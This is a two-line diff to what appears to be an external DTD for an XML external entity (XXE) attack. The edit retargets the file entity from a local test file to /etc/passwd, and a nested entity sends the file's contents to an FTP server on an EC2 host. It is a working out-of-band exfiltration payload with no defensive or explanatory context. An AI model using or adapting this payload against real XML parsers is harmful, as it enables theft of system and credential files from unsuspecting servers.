@@ -1,2 +1,2 @@
-<!ENTITY % d SYSTEM "file:///Users/tmichaud/testFile">
+<!ENTITY % d SYSTEM "file:///etc/passwd">
 <!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://ec2-54-149-38-219.us-west-2.compute.amazonaws.com:2121/%d;'>">
